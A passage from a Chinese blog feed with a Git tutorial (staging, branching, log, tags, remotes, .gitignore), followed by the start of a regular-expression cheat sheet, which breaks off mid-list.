&lt;file&gt;..."</span> to unstage)</span><br><span class="line"></span><br><span class="line">        new file:   README.md</span><br></pre></td></tr></table></figure><h3 id="从缓存中移除文件-git-reset-HEAD"><a href="#从缓存中移除文件-git-reset-HEAD" class="headerlink" title="从缓存中移除文件 git reset HEAD"></a>从缓存中移除文件 git reset HEAD</h3><p>git reset HEAD 命令用于取消已缓存的内容。<br>我们先改动文件 README 文件，内容如下：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">#README.md</span></span><br><span class="line"></span><br><span class="line"><span class="section">##This is readme markdown file</span></span><br></pre></td></tr></table></figure><p>HelloWorld.java 文件修改为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Hello World!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在两个文件修改后，都提交到了缓存区，我们现在要取消其中一个的缓存，操作如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ git status -s</span><br><span class="line"> M HelloWorld.java</span><br><span class="line"> M README.md</span><br><span class="line">$ git add .</span><br><span class="line">$ git status -s</span><br><span class="line">M  HelloWorld.java</span><br><span class="line">M  README.md</span><br><span class="line">$ git reset HEAD -- HelloWorld.java</span><br><span class="line">Unstaged changes after reset:</span><br><span class="line">M       HelloWorld.java</span><br><span class="line">$ git status -s</span><br><span class="line"> M HelloWorld.java</span><br><span class="line">M  README.md</span><br></pre></td></tr></table></figure><p>现在执行 git commit，只会将 README.md 文件的改动提交，而 HelloWorld.java 是没有的。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ git commit -m <span class="string">"change"</span></span><br><span class="line">[master ad5f6fe] change</span><br><span class="line"> 1 file changed, 1 insertion(+), 1 deletion(-)</span><br><span class="line">$ git status -s</span><br><span class="line"> M HelloWorld.java</span><br></pre></td></tr></table></figure><p>可以看到 HelloWorld.java 文件的修改并为提交。<br>这时我们可以使用以下命令将 HelloWorld.java 的修改提交：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ git commit -am <span class="string">"修改 HelloWorld.java 文件"</span></span><br><span class="line">[master a055c08] 修改 HelloWorld.java 文件</span><br><span class="line"> 1 file changed, 1 insertion(+), 1 deletion(-)</span><br><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">nothing to commit, working directory clean</span><br></pre></td></tr></table></figure><p>简而言之，执行 git reset HEAD 以取消之前 git add 添加，但不希望包含在下一提交快照中的缓存。</p><h3 id="从缓存以及工作目录删除文件-git-rm"><a href="#从缓存以及工作目录删除文件-git-rm" class="headerlink" title="从缓存以及工作目录删除文件 git rm"></a>从缓存以及工作目录删除文件 git rm</h3><p>git rm 会将条目从缓存区中移除。这与 git reset HEAD 将条目取消缓存是有区别的。 “取消缓存”的意思就是将缓存区恢复为我们做出修改之前的样子。<br>默认情况下，git rm file 会将文件从缓存区和你的硬盘中（工作目录）删除。<br>如果你要在工作目录中留着该文件，可以使用 git rm –cached：<br>如我们删除 hello.java文件：(包括在本地目录下的文件，可能需要选项<strong>-f</strong>)</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ git rm HelloWorld.java</span><br><span class="line">rm <span class="string">'HelloWorld.java'</span></span><br><span class="line">$ ls</span><br><span class="line">README.md</span><br></pre></td></tr></table></figure><p>不从工作区中删除文件：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ git rm README.md --cached</span><br><span class="line">rm <span class="string">'README.md'</span></span><br><span class="line">$ ls</span><br><span class="line">README.md</span><br></pre></td></tr></table></figure><h3 id="修改缓存中文件名-git-mv"><a href="#修改缓存中文件名-git-mv" class="headerlink" title="修改缓存中文件名 git mv"></a>修改缓存中文件名 git mv</h3><p>git mv 命令做得所有事情就是 git rm –cached 命令的操作， 重命名磁盘上的文件，然后再执行 git add 把新文件添加到缓存区。<br>我们先把刚移除的 README 添加回来：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ git add README.md</span><br><span class="line">$ git mv README.md README</span><br><span class="line">$ ls</span><br><span class="line">README</span><br></pre></td></tr></table></figure><hr><h3 id="Git分支管理"><a href="#Git分支管理" class="headerlink" title="Git分支管理"></a>Git分支管理</h3><p>几乎每一种版本控制系统都以某种形式支持分支。使用分支意味着你可以从开发主线上分离开来，然后在不影响主线的同时继续工作。<br>有人把 Git 的分支模型称为”必杀技特性”，而正是因为它，将 Git 从版本控制系统家族里区分出来。<br>创建分支命令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#创建分支</span></span><br><span class="line">$ git branch [branch name]</span><br><span class="line"><span class="comment">#切换分支</span></span><br><span class="line">$ git checkout [branch name]</span><br><span class="line"><span class="comment">#创建并切换分支</span></span><br><span class="line">$ git checkout -b [branch name]</span><br><span class="line"><span class="comment">#合并分支</span></span><br><span class="line">$ git merge</span><br><span class="line"><span class="comment">#删除分支</span></span><br><span class="line">$ git branch -d [branch name]</span><br></pre></td></tr></table></figure><h3 id="Git分支管理-1"><a href="#Git分支管理-1" class="headerlink" title="Git分支管理"></a>Git分支管理</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#列出问题</span></span><br><span class="line">$ git branch</span><br><span class="line"><span class="comment">#无参数时，该命令会列出本地分支</span></span><br><span class="line">$ git branch</span><br><span class="line">* master</span><br><span class="line"><span class="comment">#创建分支</span></span><br><span class="line">$ git branch testbranch</span><br><span class="line">$ git branch</span><br><span class="line">*branch</span><br><span class="line">4testbranch</span><br><span class="line">$ git branch testing</span><br><span class="line">$ git branch -D testing</span><br><span class="line">Deleted branch testing (was 84b13b9).</span><br><span class="line"><span class="comment">#合并分支,将分支[branch name] 合并到当前分支</span></span><br><span class="line">$ git merge [branch name]</span><br><span class="line">$ git merge <span class="built_in">test</span></span><br><span class="line">Updating b04e1bb..d3c2604</span><br><span class="line">Fast-forward</span><br><span class="line"> testB | 0</span><br><span class="line"> 1 file changed, 0 insertions(+), 0 deletions(-)</span><br><span class="line"> create mode 100644 testB</span><br></pre></td></tr></table></figure><h3 id="Git-查看提交历史-git-log"><a href="#Git-查看提交历史-git-log" class="headerlink" title="Git 查看提交历史    git log"></a>Git 查看提交历史    <code>git log</code></h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">log</span></span><br><span class="line">commit d3c26045edb80258c9b785f5cd70cff6c7130003 (HEAD -&gt; master, origin/<span class="built_in">test</span>, <span class="built_in">test</span>)</span><br><span class="line">Author: Magic &lt;xxx@qq.com&gt;</span><br><span class="line">Date:   Sat Sep 28 23:41:42 2019 +0800</span><br><span class="line"></span><br><span class="line">    ff</span><br><span class="line"></span><br><span class="line">commit b04e1bba77e04dde1e5649aaf32ef7029a1dbd5f (origin/master)</span><br><span class="line">Author: Magic &lt;xxx@qq.com&gt;</span><br><span class="line">Date:   Sat Sep 28 23:40:34 2019 +0800</span><br><span class="line"></span><br><span class="line">    fuck</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#可以用 --oneline 选项来查看历史记录的简洁的版本</span></span><br><span class="line">$ git <span class="built_in">log</span> --oneline</span><br><span class="line">d3c2604 (HEAD -&gt; master, origin/<span class="built_in">test</span>, <span class="built_in">test</span>) ff</span><br><span class="line">b04e1bb (origin/master) fuck</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#可以用 --graph 选项，查看历史中什么时候出现了分支、合并。以下为相同的命令，开启了拓扑图选项：</span></span><br><span class="line">$  git <span class="built_in">log</span> --graph</span><br><span class="line">* commit d3c26045edb80258c9b785f5cd70cff6c7130003 (HEAD -&gt; master, origin/<span class="built_in">test</span>, <span class="built_in">test</span>)</span><br><span class="line">| Author: Magic-King &lt;xxx@qq.com&gt;</span><br><span class="line">| Date:   Sat Sep 28 23:41:42 2019 +0800</span><br><span class="line">|</span><br><span class="line">|     ff</span><br><span class="line">|</span><br><span class="line">* commit b04e1bba77e04dde1e5649aaf32ef7029a1dbd5f (origin/master)</span><br><span class="line">  Author: Magic-King &lt;xxx@qq.com&gt;</span><br><span class="line">  Date:   Sat Sep 28 23:40:34 2019 +0800</span><br><span class="line"></span><br><span class="line">      fuck</span><br><span class="line">      </span><br><span class="line"><span class="comment">#可以用 ‘--reverse’参数来逆向显示所有日志</span></span><br><span class="line">$ git <span class="built_in">log</span> --reverse</span><br><span class="line">commit b04e1bba77e04dde1e5649aaf32ef7029a1dbd5f (origin/master)</span><br><span class="line">Author: Magic-King &lt;xxx@qq.com&gt;</span><br><span class="line">Date:   Sat Sep 28 23:40:34 2019 +0800</span><br><span class="line"></span><br><span class="line">    fuck</span><br><span class="line"></span><br><span class="line">commit d3c26045edb80258c9b785f5cd70cff6c7130003 (HEAD -&gt; master, origin/<span class="built_in">test</span>, <span class="built_in">test</span>)</span><br><span class="line">Author: Magic-King &lt;xxx@qq.com&gt;</span><br><span class="line">Date:   Sat Sep 28 23:41:42 2019 +0800</span><br><span class="line"></span><br><span class="line">    ff</span><br></pre></td></tr></table></figure><h3 id="Git-标签-git-tag"><a href="#Git-标签-git-tag" class="headerlink" title="Git 标签  git tag"></a>Git 标签  <code>git tag</code></h3><p>如果达到一个重要的阶段，并希望永远记住那个特别的提交快照，可以使用 git tag 给它打上标签。<br>比如说，我们想为我们的项目发布一个”1.0”版本。 可以用 git tag -a v1.0 命令给最新一次提交打上（HEAD）”v1.0”的标签。<br>-a 选项意为”创建一个带注解的标签”。 不用 -a 选项也可以执行的，但它不会记录这标签是啥时候打的，谁打的，也不会让你添加个标签的注解。 我推荐一直创建带注解的标签。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">log</span> --oneline --graph --decorate</span><br><span class="line">*   2b5970d (HEAD -&gt; master, tag: v1.0) Merge branch <span class="string">'change_site'</span></span><br><span class="line">|\</span><br><span class="line">| * d17a0a0 (change_site) change the site</span><br><span class="line">* | e2714c9 新增加一行</span><br><span class="line">|/</span><br><span class="line">* 202199d (newtest) add test.txt file</span><br><span class="line">* a055c08 修改 HelloWorld.java 文件</span><br><span class="line">* ad5f6fe 修改</span><br><span class="line">* c2c167c 修改HelloWorld.java文件</span><br><span class="line">* f9393bf third commit ``</span><br><span class="line">* 316fafc second commit</span><br><span class="line">* fdd5c53 inital commit</span><br></pre></td></tr></table></figure><p>如果我们忘了给某个提交打标签，又将它发布了，我们可以给它追加标签。<br>例如，假设我们发布了提交 85fc7e7(上面实例最后一行)，但是那时候忘了给它打标签。 我们现在也可以：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ git tag -a v0.9 a055c08</span><br><span class="line">$ git <span class="built_in">log</span> --oneline --graph --decorate</span><br><span class="line">*   2b5970d (HEAD -&gt; master, tag: v1.0) Merge branch <span class="string">'change_site'</span></span><br><span class="line">|\</span><br><span class="line">| * d17a0a0 (change_site) change the site</span><br><span class="line">* | e2714c9 新增加一行</span><br><span class="line">|/</span><br><span class="line">* 202199d (newtest) add test.txt file</span><br><span class="line">* a055c08 (tag: v0.9) 修改 HelloWorld.java 文件</span><br><span class="line">* ad5f6fe 修改</span><br><span class="line">* c2c167c 修改HelloWorld.java文件</span><br><span class="line">* f9393bf third commit ``</span><br><span class="line">* 316fafc second commit</span><br><span class="line">* fdd5c53 inital commit</span><br></pre></td></tr></table></figure><p>如果要查看所有标签可以使用以下命令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git tag</span><br></pre></td></tr></table></figure><p>指定标签信息命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git tag -a &lt;tagname&gt; -m <span class="string">"标签"</span></span><br></pre></td></tr></table></figure><p>PGP签名标签命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git tag -s &lt;tagname&gt; -m <span class="string">"标签"</span></span><br></pre></td></tr></table></figure><h3 id="Git-远程仓库的操作"><a href="#Git-远程仓库的操作" class="headerlink" title="Git 远程仓库的操作"></a>Git 远程仓库的操作</h3><h4 id="查看当前远程库"><a href="#查看当前远程库" class="headerlink" title="查看当前远程库"></a>查看当前远程库</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ git remote</span><br><span class="line">origin</span><br><span class="line">$ git remote -v</span><br><span class="line">origin  git@xx.xx.xxx.xxx:/test.git (fetch)</span><br><span class="line">origin  git@xx.xx.xxx.xxx:/test.git (push)</span><br></pre></td></tr></table></figure><h4 id="提取远程库"><a href="#提取远程库" class="headerlink" title="提取远程库"></a>提取远程库</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git pull</span><br></pre></td></tr></table></figure><p>该命令就是在执行 git fetch 之后紧接着执行 git merge 远程分支到你所在的任意分支。<br>假设你配置好了一个远程仓库，并且你想要提取更新的数据，你可以首先执行 git fetch [alias] 告诉 Git 去获取它有你没有的数据，然后你可以执行 git merge [alias]/[branch] 以将服务器上的任何更新（假设有人这时候推送到服务器了）合并到你的当前分支。</p><p>接下来我们在 Github 上点击”test.txt” 并在线修改它。之后我们在本地更新修改。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ git fetch origin</span><br><span class="line">remote: Counting objects: 3, <span class="keyword">done</span>.</span><br><span class="line">remote: Compressing objects: 100% (3/3), <span class="keyword">done</span>.</span><br><span class="line">remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0</span><br><span class="line">Unpacking objects: 100% (3/3), <span class="keyword">done</span>.</span><br><span class="line">From github.com:onlynight/GitAdd</span><br><span class="line">   774112b..37be49b  master     -&gt; origin/master</span><br><span class="line">$ git merge origin/master</span><br><span class="line">Updating 774112b..37be49b</span><br><span class="line">Fast-forward</span><br><span class="line"> test.txt | 1 +</span><br><span class="line"> 1 file changed, 1 insertion(+)</span><br></pre></td></tr></table></figure><h4 id="推送远程库"><a href="#推送远程库" class="headerlink" title="推送远程库"></a>推送远程库</h4><p>推送你的新分支与数据到某个远端仓库命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#该命令将你的 [branch] 分支推送成为 [alias] 远程仓库上的 [branch] 分支</span></span><br><span class="line">$ git push [<span class="built_in">alias</span>] [branch]</span><br><span class="line"></span><br><span class="line">$ git push origin master</span><br><span class="line">Everything up-to-date</span><br></pre></td></tr></table></figure><h4 id="删除远程分支"><a href="#删除远程分支" class="headerlink" title="删除远程分支"></a>删除远程分支</h4><p>注意：如果要<em>删除远程分支</em>同样也是使用push命令，在分支前加上”:”表示<em>删除远程分支</em>，代码如下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git push origin :&lt;branch name&gt;</span><br></pre></td></tr></table></figure><h4 id="删除本地仓库的远程仓库链接"><a href="#删除本地仓库的远程仓库链接" class="headerlink" title="删除本地仓库的远程仓库链接"></a>删除本地仓库的远程仓库链接</h4><p>删除远程仓库你可以使用命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">git remote rm [<span class="built_in">alias</span>]</span><br><span class="line"></span><br><span class="line">$ git remote -v</span><br><span class="line">origin  git@github.com:onlynight/GitAdd.git (fetch)</span><br><span class="line">origin  git@github.com:onlynight/GitAdd.git (push)</span><br><span class="line">$ git remote -v</span><br><span class="line">origin  git@github.com:onlynight/GitAdd.git (fetch)</span><br><span class="line">origin  git@github.com:onlynight/GitAdd.git (push)</span><br><span class="line">origin2 git@github.com:onlnynight/GitAdd.git (fetch)</span><br><span class="line">origin2 git@github.com:onlnynight/GitAdd.git (push)</span><br><span class="line">$ git remote rm origin2</span><br><span class="line">$ git remote -v</span><br><span class="line">origin  git@github.com:onlynight/GitAdd.git (fetch)</span><br><span class="line">origin  git@github.com:onlynight/GitAdd.git (push)</span><br></pre></td></tr></table></figure><h3 id="忽略特殊文件"><a href="#忽略特殊文件" class="headerlink" title="忽略特殊文件"></a>忽略特殊文件</h3><p>有些时候，你必须把某些文件放到Git工作目录中，但又不能提交它们，比如保存了数据库密码的配置文件啦，等等，每次<code>git status</code>都会显示<code>Untracked files ...</code>，有强迫症的童鞋心里肯定不爽。</p><p>好在Git考虑到了大家的感受，这个问题解决起来也很简单，在Git工作区的根目录下创建一个特殊的<code>.gitignore</code>文件，然后把要忽略的文件名填进去，Git就会自动忽略这些文件。</p><p>不需要从头写<code>.gitignore</code>文件，GitHub已经为我们准备了各种配置文件，只需要组合一下就可以使用了。所有配置文件可以直接在线浏览：<a href="https://github.com/github/gitignore" target="_blank" rel="noopener">https://github.com/github/gitignore</a></p><p>忽略文件的原则是：</p><ol><li>忽略操作系统自动生成的文件，比如缩略图等；</li><li>忽略编译生成的中间文件、可执行文件等，也就是如果一个文件是通过另一个文件自动生成的，那自动生成的文件就没必要放进版本库，比如Java编译产生的<code>.class</code>文件；</li><li>忽略你自己的带有敏感信息的配置文件，比如存放口令的配置文件。</li></ol><p>举个例子：</p><p>假设你在Windows下进行Python开发，Windows会自动在有图片的目录下生成隐藏的缩略图文件，如果有自定义目录，目录下就会有<code>Desktop.ini</code>文件，因此你需要忽略Windows自动生成的垃圾文件：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Windows:</span></span><br><span class="line">Thumbs.db</span><br><span class="line">ehthumbs.db</span><br><span class="line">Desktop.ini</span><br><span class="line"><span class="comment"># Python:</span></span><br><span class="line">*.py[cod]</span><br><span class="line">*.so</span><br><span class="line">*.egg</span><br><span class="line">*.egg-info</span><br><span class="line">dist</span><br><span class="line">build</span><br><span class="line"><span class="comment"># My configurations:</span></span><br><span class="line">db.ini</span><br><span class="line">deploy_key_rsa</span><br></pre></td></tr></table></figure><p>最后一步就是把<code>.gitignore</code>也提交到Git，就完成了！当然检验<code>.gitignore</code>的标准是<code>git status</code>命令是不是说<code>working directory clean</code>。</p><p>使用Windows的童鞋注意了，如果你在资源管理器里新建一个<code>.gitignore</code>文件，它会非常弱智地提示你必须输入文件名，但是在文本编辑器里“保存”或者“另存为”就可以把文件保存为<code>.gitignore</code>了。</p><p>有些时候，你想添加一个文件到Git，但发现添加不了，原因是这个文件被<code>.gitignore</code>忽略了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ git add App.class</span><br><span class="line">The following paths are ignored by one of your .gitignore files:</span><br><span class="line">App.class</span><br><span class="line">Use -f if you really want to add them.</span><br></pre></td></tr></table></figure><p>如果你确实想添加该文件，可以用<code>-f</code>强制添加到Git：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="keyword">add</span><span class="bash"> -f App.class</span></span><br></pre></td></tr></table></figure><p>或者你发现，可能是<code>.gitignore</code>写得有问题，需要找出来到底哪个规则写错了，可以用<code>git check-ignore</code>命令检查：</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git<span class="built_in"> check-ignore </span>-v App.class</span><br><span class="line"><span class="keyword">.gitignore</span>:3:*.classApp.class</span><br></pre></td></tr></table></figure><p>Git会告诉我们，<code>.gitignore</code>的第3行规则忽略了该文件，于是我们就可以知道应该修订哪个规则。</p><ul><li>后续：搭建git服务器</li></ul>]]></content>
      
      
      <categories>
          
          <category> git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Regular Expression</title>
      <link href="/2019/09/22/re/"/>
      <url>/2019/09/22/re/</url>
      
        <content type="html"><![CDATA[<h2 id="正则表达式的规则"><a href="#正则表达式的规则" class="headerlink" title="正则表达式的规则"></a>正则表达式的规则</h2><p>常用元字符</p><table><thead><tr><th style="text-align:left">代码</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">.</td><td style="text-align:left">匹配除换行符以外的任意字符</td></tr><tr><td style="text-align:left">\w</td><td style="text-align:left">匹配字母或数字或下划线</td></tr><tr><td style="text-align:left">\s</td><td style="text-align:left">匹配任意的空白符</td></tr><tr><td style="text-align:left">\d</td><td style="text-align:left">匹配数字</td></tr><tr><td style="text-align:left">\b</td><td style="text-align:left">匹配单词的开始或结束</td></tr><tr><td style="text-align:left">^</td><td style="text-align:left">匹配字符串的开始</td></tr><tr><td style="text-align:left">$</td><td style="text-align:left">匹配字符串的结束</td></tr></tbody></table><p>常用限定符</p><table><thead><tr><th style="text-align:left">代码/语法</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">*</td><td style="text-align:left">重复零次或更多次</td></tr><tr><td style="text-align:left">+</td><td style="text-align:left">重复一次或更多次</td></tr><tr><td style="text-align:left">?</td><td style="text-align:left">重复零次或一次</td></tr><tr><td style="text-align:left">{n}</td><td style="text-align:left">重复n次</td></tr><tr><td style="text-align:left">{n,}</td><td style="text-align:left">重复n次或更多次</td></tr><tr><td style="text-align:left">{n,m}</td><td style="text-align:left">重复n到m次</td></tr></tbody></table><p>常用反义词</p><table><thead><tr><th style="text-align:left">代码/语法</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">\W</td><td style="text-align:left">匹配任意不是字母，数字，下划线，汉字的字符</td></tr><tr><td style="text-align:left">\S</td><td style="text-align:left">匹配任意不是空白符的字符</td></tr><tr><td style="text-align:left">\D</td><td style="text-align:left">匹配任意非数字的字符</td></tr><tr><td style="text-align:left">\B</td><td style="text-align:left">匹配不是单词开头或结束的位置</td></tr><tr><td style="text-align:left">[^x]</td><td style="text-align:left">匹配除了x以外的任意字符</td></tr><tr><td style="text-align:left">[^aeiou]</td><td style="text-align:left">匹配除了aeiou这几个字母以外的任意字符</td></tr></tbody></table><p><strong>预定义字符集表</strong></p><table><thead><tr><th>\d</th><th>\d匹配任何十进制数，它相当于类[0-9]，\d+如果需要匹配一位或者多位数的数字时用</th></tr></thead><tbody><tr><td>\D</td><td>\D匹配任何非数字字符，它相当于类[^0-9]</td></tr><tr><td>\s</td><td>\s匹配任何空白字符，它相当于类[\t\n\r\f\v]</td></tr><tr><td>\S</td><td>\S匹配任何非空白字符，它相当于类[^\t\n\r\f\v]</td></tr><tr><td>\w</td><td>\w匹配包括下划线在内任何字母数字字符，它相当于类  <code>{a-z,A-Z,0-9,_}</code></td></tr><tr><td>\W</td><td>\W匹配非任何字母数字字符包括下划线在内，它相当于类 <code>{ ^a-z,A-Z,0-9,_}</code></td></tr><tr><td>\A</td><td>仅匹配字符串开头,同^</td></tr><tr><td>\Z</td><td>仅匹配字符串结尾，同$</td></tr><tr><td>\b</td><td>b匹配一个单词边界，也就是指单词和空格间的位置</td></tr><tr><td>\B</td><td>[^\b]</td></tr></tbody></table><h2 id="常用正则表达式"><a href="#常用正则表达式" class="headerlink" title="常用正则表达式"></a>常用正则表达式</h2><blockquote><p>引用：<a href="http://www.cnblogs.com/zxin/archive/2013/01/26/2877765.html" target="_blank" rel="noopener">史上最全常用正则表达式大全</a></p></blockquote><h3 id="一、校验数字的表达式"><a href="#一、校验数字的表达式" class="headerlink" title="一、校验数字的表达式"></a>一、校验数字的表达式</h3><ol><li><p>数字：<code>^[0-9]*$</code></p></li><li><p>n位的数字：<code>^\d{n}$</code></p></li><li><p>至少n位的数字：<code>^\d{n,}$</code></p></li><li><p>m-n位的数字：<code>^\d{m,n}$</code></p></li><li><p>零和非零开头的数字：<code>^(0|[1-9][0-9]*)$</code></p></li><li><p>非零开头的最多带两位小数的数字：<code>^([1-9][0-9]*)+(.[0-9]{1,2})?$</code></p></li><li><p>带1-2位小数的正数或负数：<code>^(\-)?\d+(\.\d{1,2})?$</code></p></li><li><p>正数、负数、和小数：<code>^(\-|\+)?\d+(\.\d+)?$</code></p></li><li><p>有两位小数的正实数：<code>^[0-9]+(.[0-9]{2})?$</code></p></li><li><p>有1~3位小数的正实数：<code>^[0-9]+(.[0-9]{1,3})?$</code></p></li><li><p>非零的正整数：<code>^[1-9]\d*$</code> 或 <code>^([1-9][0-9]*){1,3}$</code> 或 